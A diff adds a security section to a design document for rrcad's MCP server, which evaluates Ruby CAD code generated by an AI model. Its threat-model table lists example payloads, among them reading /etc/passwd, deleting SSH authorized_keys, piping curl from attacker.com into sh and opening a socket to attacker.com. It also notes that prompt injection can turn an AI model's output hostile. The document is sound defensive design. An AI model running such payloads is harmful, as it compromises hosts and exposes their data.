@@ -422,6 +422,155 @@ Sprint 5: Expose rrcad://api and rrcad://examples resources.
 
 ---
 
+### Security
+
+The MCP server evaluates Ruby DSL code supplied by an AI model.  The code is
+not written by a human developer — it is generated at runtime and could contain
+hostile payloads injected via prompt-injection attacks or model misbehaviour.
+Every layer of defence below must be in place before the MCP mode is shipped.
+
+#### Threat model
+
+| Threat | Example payload | Impact |
+|--------|----------------|--------|
+| Filesystem read | `File.read("/etc/passwd")` | Data exfiltration |
+| Filesystem write/delete | `File.delete("/home/user/.ssh/authorized_keys")` | Data loss / privilege escalation |
+| Shell execution | `IO.popen("curl attacker.com \| sh")` | Full host compromise |
+| Network access | `require 'socket'; TCPSocket.new("attacker.com", 443)` | Data exfiltration / C2 |
+| Directory traversal | `Dir.glob("/**/*")` | Information disclosure |
+| Resource exhaustion | `loop { x = "A" * 10_000_000 }` | DoS / OOM |
+| State pollution | Redefine `box`, `cut`, etc. between calls | Corrupted subsequent tool results |
+
+#### Mitigation 1 — Custom MCP-safe mRuby build (most important)
+
+The current vendored mRuby is built with `gembox 'default'`, which pulls in
+`stdlib-io` (`mruby-io`, `mruby-socket`, `mruby-dir`, `mruby-errno`) and
+`metaprog` (`mruby-eval`, `mruby-metaprog`).  These are the primary attack
+surface.
+
+Create a dedicated `mcp_safe.gembox` that includes **only** what the DSL needs:
+
+```ruby
+# vendor/mruby/build_config/mcp_safe.gembox
+MRuby::GemBox.new do |conf|
+  conf.gembox "stdlib"      # String, Array, Hash, Comparable, Enumerable, …
+  conf.gembox "math"        # Math module (sin, cos, sqrt, …)
+  # Deliberately omitted:
+  #   stdlib-io   → mruby-io, mruby-socket, mruby-dir (filesystem + network)
+  #   metaprog    → mruby-eval, mruby-metaprog (dynamic eval + reflection)
+end
+```
+
+Build with this gembox when `--mcp` is active.  Removing `mruby-io` at compile
+time eliminates `File`, `IO`, `Dir`, `Socket`, and `IO.popen` from the VM
+entirely — no runtime checks needed.  This is the only reliable mitigation for
+shell-execution attacks.
+
+#### Mitigation 2 — Runtime prelude hardening (defence in depth)
+
+Even with the restricted gembox, define a Ruby prelude that disables any
+remaining dangerous kernel methods before user code runs:
+
+```ruby
+# Evaluated once at VM startup in MCP mode, before loading the DSL prelude.
+[
+  :system, :exec, :spawn, :fork, :exit, :exit!, :abort,
+  :`, :puts, :print, :p, :pp, :gets, :readline
+].each do |m|
+  Kernel.send(:undef_method, m) rescue nil
+end
+```
+
+This is a second line of defence — it does not replace Mitigation 1 but covers
+any core methods not gated behind a gem.
+
+#### Mitigation 3 — Execution timeout
+
+Wrap every `MrubyVm::eval` call in a watchdog thread.  If evaluation exceeds
+the limit, send `SIGALRM` (Unix) or terminate the thread and return an error:
+
+```rust
+const MCP_EVAL_TIMEOUT: Duration = Duration::from_secs(30);
+```
+
+Prevents infinite loops and pathologically large geometry from stalling the
+server indefinitely.
+
+#### Mitigation 4 — Memory limit
+
+Before spawning the mRuby eval, set an address-space ceiling via
+`setrlimit(RLIMIT_AS)` (Linux / macOS) to prevent the Ruby code from
+allocating unbounded memory and triggering OOM:
+
+```rust
+// ~512 MB: enough for complex OCCT geometry; not enough to DoS the host.
+const MCP_MEMORY_LIMIT_BYTES: u64 = 512 * 1024 * 1024;
+```
+
+#### Mitigation 5 — Export path confinement
+
+`cad_export` must never accept a user-controlled output path.  The server
+generates its own filename inside a fixed sandbox directory:
+
+```
+/tmp/rrcad_mcp/<UUID>.<ext>
+```
+
+- The sandbox directory is created on server startup with mode `0700`.
+- Paths are never constructed from tool input; the format argument is
+  validated against an allowlist (`step`, `stl`, `glb`, `gltf`, `obj`).
+- Files are cleaned up after a configurable TTL (default: 1 hour) via a
+  background sweeper thread.
+
+#### Mitigation 6 — Per-call VM isolation
+
+Recreate `MrubyVm` for every tool call.  This prevents:
+- Global variable or constant pollution from a previous call affecting
+  subsequent calls.
+- A partially-evaluated script leaving the DSL in an inconsistent state.
+
+Cost: ~5 ms per call (mRuby init + prelude load).  Acceptable for MCP latency.
+
+#### Mitigation 7 — Input validation
+
+Before passing the `code` string to `MrubyVm::eval`:
+
+1. **Length cap** — reject inputs longer than 64 KB; legitimate DSL scripts
+   are never this large.
+2. **Null-byte check** — reject strings containing `\0`; mRuby's C string
+   handling truncates at null bytes, which could bypass prelude hardening.
+3. **Format allowlist** — the `format` parameter of `cad_export` must be
+   one of `["step", "stl", "glb", "gltf", "obj"]`; reject everything else.
+
+#### Mitigation 8 — OS-level sandboxing (optional, production hardening)
+
+For deployments where stronger guarantees are needed, wrap the `rrcad --mcp`
+process in an OS sandbox:
+
+- **Linux** — `landlock` (filesystem access control, kernel ≥ 5.13) +
+  `seccomp` (syscall allowlist).  Drop all syscalls except the minimum needed
+  for OCCT computation (no `socket`, no `execve`, no `openat` outside the
+  sandbox dir).
+- **macOS** — `sandbox_init("no-internet", ...)` profile.
+
+This is defence-in-depth on top of Mitigations 1–7; it requires no changes to
+rrcad's Rust code, only the process launch wrapper (e.g. a systemd unit with
+`SystemCallFilter=` or a shell wrapper using `unshare`).
+
+#### Security checklist (must pass before shipping MCP mode)
+
+- [ ] `mcp_safe.gembox` built and linked when `--mcp` is active
+- [ ] `File`, `IO`, `Dir`, `Socket` unavailable inside a `cad_eval` call
+      (verify with a test: `vm.eval("File.read('/etc/passwd')")` must raise)
+- [ ] `IO.popen` unavailable (same test pattern)
+- [ ] Eval timeout fires for `loop { }` within ≤ 30 s
+- [ ] `cad_export` rejects format strings outside the allowlist
+- [ ] `cad_export` output path is always under `/tmp/rrcad_mcp/`
+- [ ] VM is recreated for each tool call (no state bleed between calls)
+- [ ] Input longer than 64 KB returns `isError: true` without evaluating
+
+---
+
 ## Architecture Notes
 
 See `CLAUDE.md` and `doc/development.md` for the full architecture and
